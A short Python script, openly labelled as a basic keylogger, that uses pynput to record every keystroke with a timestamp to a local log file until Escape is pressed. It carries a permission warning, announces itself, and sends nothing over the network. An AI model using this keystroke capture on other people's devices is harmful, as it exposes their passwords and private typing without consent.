"""
Basic Keylogger - Records keystrokes and saves them to a file.

IMPORTANT: Use only on computers you own or have explicit permission to monitor.
Unauthorized use may be illegal.
"""

from pynput import keyboard # type: ignore
from datetime import datetime
import os

# Configuration
LOG_FILE = "keystrokes.log"
OUTPUT_DIR = os.path.dirname(os.path.abspath(__file__))


def on_press(key):
    """Callback when a key is pressed."""
    try:
        log_entry = key.char
    except AttributeError:
        # Special keys (Shift, Enter, etc.)
        log_entry = f"[{key.name}]"
    
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_line = f"{timestamp} - {log_entry}\n"
    
    filepath = os.path.join(OUTPUT_DIR, LOG_FILE)
    with open(filepath, "a", encoding="utf-8") as f:
        f.write(log_line)


def on_release(key):
    """Callback when a key is released. Stop listener with Escape."""
    if key == keyboard.Key.esc:
        return False  # Stop the listener


def main():
    log_path = os.path.join(OUTPUT_DIR, LOG_FILE)
    print(f"Keylogger started. Logging to: {log_path}")
    print("Press ESC to stop.\n")
    
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    
    print("Keylogger stopped.")


if __name__ == "__main__":
    main()
